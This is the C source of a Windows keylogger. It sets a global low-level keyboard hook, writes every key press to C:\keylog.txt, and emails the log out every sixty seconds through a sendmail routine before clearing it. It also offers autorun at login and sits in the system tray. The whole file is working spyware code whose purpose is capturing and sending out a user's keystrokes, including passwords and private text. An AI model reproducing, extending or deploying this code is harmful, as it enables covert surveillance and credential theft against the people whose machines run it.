#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include "main.h"
#include "resource.h"
#include "key_names.h"
#include "timestamp.h"
#include "autorun.h"
#include "sendmail.h"

#define WM_TRAY (WM_USER + 1000)
#define ID_AUTORUN 2000
#define ID_EXIT    2001
#define TIMER_ID   5000
#define TIMER_ELAPSE_MS 1000
#define MAIL_SEND_PERIOD_S 60

#define KEYLOG_PATH "C:\\keylog.txt"

NOTIFYICONDATA pnid;
HMENU hMenu;

HANDLE sender_thread_id = 0;
time_t last_send_time_s = 0;

void open_keylog_file(int truncate)
{
    int ok;

    if (truncate)
        ok = freopen(KEYLOG_PATH, "w", stdout) != NULL;
    else
        ok = freopen(KEYLOG_PATH, "a", stdout) != NULL;

    if (!ok)
        exit(EXIT_FAILURE);
}

void show_popup_menu(HWND hWnd)
{
    POINT cursor;
    GetCursorPos(&cursor);

    SetForegroundWindow(hWnd);
    TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, cursor.x, cursor.y,
        0, hWnd, NULL);
    PostMessage(hWnd, WM_NULL, 0, 0);
}

void reinit_menu(int create)
{
    if (create) {
        hMenu = CreatePopupMenu();
        InsertMenu(hMenu, 0, MF_BYPOSITION | MF_STRING, ID_AUTORUN,
            autorun_get(NULL) ? "Autorun [enabled]" : "Autorun [disabled]");
        InsertMenu(hMenu, 1, MF_BYPOSITION | MF_STRING, ID_EXIT, "Exit");
    } else {
        ModifyMenu(hMenu, 0, MF_BYPOSITION | MF_STRING, ID_AUTORUN,
            autorun_get(NULL) ? "Autorun [enabled]" : "Autorun [disabled]");
    }
}

DWORD WINAPI sendmail_thread_proc(LPVOID lpParameter)
{
    int ok;

    DEBUG_LOG("Before mail sending.");
    ok = sendmail(KEYLOG_PATH);

    if (ok) {
        DEBUG_LOG("Mail sending success.");
        fclose(stdout);
        open_keylog_file(1);
        DEBUG_LOG("File reopened.");
        time(&last_send_time_s);
    } else {
        DEBUG_LOG("Mail sending failed.");
    }

    return 0;
}

void check_for_keylog_send()
{
    /* Set id to zero, if thread terminated. */
    if (sender_thread_id != 0 &&
        WaitForSingleObject(sender_thread_id, 0) == WAIT_OBJECT_0)
    {
        CloseHandle(sender_thread_id);
        sender_thread_id = 0;
        DEBUG_LOG("Thread terminated.");
    }

    /* If no thread running and time period elapsed, create
     * new sender thread. */
    if (sender_thread_id == 0 &&
        time(NULL) - last_send_time_s > MAIL_SEND_PERIOD_S)
    {
        sender_thread_id = CreateThread(NULL, 0, sendmail_thread_proc,
            NULL, 0, NULL);
        DEBUG_LOG("Thread created.");
    }
}

LRESULT CALLBACK window_proc(HWND hWnd, UINT uMsg,
    WPARAM wPrm, LPARAM lPrm)
{
    switch (uMsg) {
    case WM_TIMER:
        if (wPrm == TIMER_ID) {
            update_time_buf(pnid.szTip, ARRAYSIZE(pnid.szTip));
            Shell_NotifyIcon(NIM_MODIFY, &pnid);
            check_for_keylog_send();
            return 0;
        }
        break;
    case WM_TRAY:
        if (lPrm == WM_RBUTTONUP) {
            show_popup_menu(hWnd);
            return 0;
        }
        break;
    case WM_COMMAND:
        if (LOWORD(wPrm) == ID_AUTORUN) {
            autorun_set(!autorun_get(NULL));
            reinit_menu(0);
            return 0;
        } else if (LOWORD(wPrm) == ID_EXIT) {
            PostQuitMessage(0);
            return 0;
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProc(hWnd, uMsg, wPrm, lPrm);
}

LRESULT CALLBACK kbd_proc(int code, WPARAM wPrm, LPARAM lPrm)
{
    char buf[256];
    int vk_code;

    if (code < 0 || fileno(stdout) < 0)
        goto ret;

    vk_code = ((KBDLLHOOKSTRUCT *) lPrm)->vkCode;
    setKeyName(buf, vk_code);

    switch (wPrm) {
        case WM_KEYDOWN:
            printf("Key down: %s, code 0x%0X\n", buf, vk_code);
            break;
        case WM_KEYUP:
            printf("Key up: %s, code 0x%0X\n", buf, vk_code);
            break;
        case WM_SYSKEYDOWN:
            printf("Sys key down: %s, code 0x%0X\n", buf, vk_code);
            break;
        case WM_SYSKEYUP:
            printf("Sys key up: %s, code 0x%0X\n", buf, vk_code);
            break;
    }

    fflush(stdout);

ret:
    return CallNextHookEx(NULL, code, wPrm, lPrm);
}

int CALLBACK WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmdl, int show)
{
    MSG pmsg = {0};

    open_keylog_file(0);

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, kbd_proc,
        GetModuleHandle(NULL), 0);

    /* Make tray icon (initialize and copy for using
     * short structure initialize syntax). */
    NOTIFYICONDATA pnid_local = {sizeof(pnid), NULL, 1,
        NIF_MESSAGE | NIF_ICON | NIF_TIP, WM_TRAY,
        LoadIcon(inst, MAKEINTRESOURCE(AppIcon)), ""};
    memcpy(&pnid, &pnid_local, sizeof(pnid));
    update_time_buf(pnid.szTip, ARRAYSIZE(pnid.szTip));

    // Make null window.
    WNDCLASSEX wndc = {sizeof(wndc), CS_HREDRAW | CS_VREDRAW, window_proc,
        0, 0, inst, NULL, NULL, NULL, NULL, "-", NULL};
    if (!RegisterClassEx(&wndc))
        exit(EXIT_FAILURE);
    pnid.hWnd = CreateWindowEx(WS_EX_APPWINDOW, wndc.lpszClassName,
        NULL, WS_POPUP, 0, 0, 0, 0, NULL, NULL,
        wndc.hInstance, NULL);

    // Initialize autorun module.
    if (!autorun_init())
        return EXIT_FAILURE;
    autorun_fix();

    // Make right-click context menu for tray icon.
    reinit_menu(1);

    // Show icon.
    Shell_NotifyIcon(NIM_ADD, &pnid);

    SetTimer(pnid.hWnd, TIMER_ID, TIMER_ELAPSE_MS, NULL);

    while (GetMessage(&pmsg, NULL, 0, 0) > 0) {
        TranslateMessage(&pmsg);
        DispatchMessage(&pmsg);
    }

    KillTimer(pnid.hWnd, TIMER_ID);
    Shell_NotifyIcon(NIM_DELETE, &pnid);
    UnregisterClass(wndc.lpszClassName, inst);
    UnhookWindowsHookEx(hook);

    fclose(stdout);

    return pmsg.wParam;
}
